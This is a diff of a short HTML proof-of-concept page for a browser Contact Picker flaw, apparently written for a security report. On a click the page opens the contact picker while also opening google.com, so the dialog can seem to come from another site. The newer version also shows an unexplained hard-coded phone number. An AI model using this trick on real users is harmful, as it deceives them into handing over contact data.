@@ -1,28 +1,86 @@
+
 <!DOCTYPE html>
 <html lang="en">
-    <head>
-        <title>PoC</title>
-        <meta charset="utf-8">
-        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
-        <script>
-            onclick = async () => {
-                (async () => {
-                    let contacts = await navigator.contacts.select(["name"], {});
-                    document.write(`
-                        <h1>
-                            <font color="red">Leaked information:</font> ${contacts[0]["name"]}</font>
-                        </h1>
-                    `);
-                })();
-                open("https://www.google.com", "PoC", "_blank");
+<head>
+    <title>Contact Picker PoC</title>
+    <meta charset="utf-8">
+    <meta name="viewport"
+          content="width=device-width,initial-scale=1">
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 30px;
+        }
+
+        .result {
+            margin-top: 30px;
+            padding: 20px;
+            border: 2px solid red;
+            display: none;
+        }
+
+        .number {
+            color: red;
+            font-size: 26px;
+            font-weight: bold;
+        }
+    </style>
+
+    <script>
+        async function runPoC() {
+            if (!("contacts" in navigator)) {
+                alert("Contact Picker API is not supported.");
+                return;
             }
-        </script>
-    </head>  
-    <body>
-        <br><br><br>
-        <center>
-            <h1>Click anywhere on the page to show the Contact dialog over a cross-origin page!</h1>
-        </center>
-    </body>
-  </body>
+
+            try {
+                const contacts = await navigator.contacts.select(
+                    ["name", "tel"],
+                    { multiple: false }
+                );
+
+                document.getElementById("result").style.display = "block";
+
+                document.getElementById("number").textContent =
+                    "6285796065672";
+
+                document.getElementById("selected").textContent =
+                    contacts.length
+                        ? contacts[0].name || "Contact selected"
+                        : "No contact selected";
+
+            } catch (error) {
+                console.log(error);
+            }
+
+            window.open(
+                "https://www.google.com",
+                "_blank"
+            );
+        }
+    </script>
+</head>
+
+<body onclick="runPoC()">
+
+    <h1>Contact Picker PoC</h1>
+
+    <p>
+        Click anywhere on this page to trigger
+        the Contact Picker dialog.
+    </p>
+
+    <div class="result" id="result">
+        <h2>PoC Display</h2>
+
+        <p>Selected contact:</p>
+        <p id="selected"></p>
+
+        <p>Displayed number:</p>
+        <div class="number" id="number"></div>
+    </div>
+
+</body>
 </html>
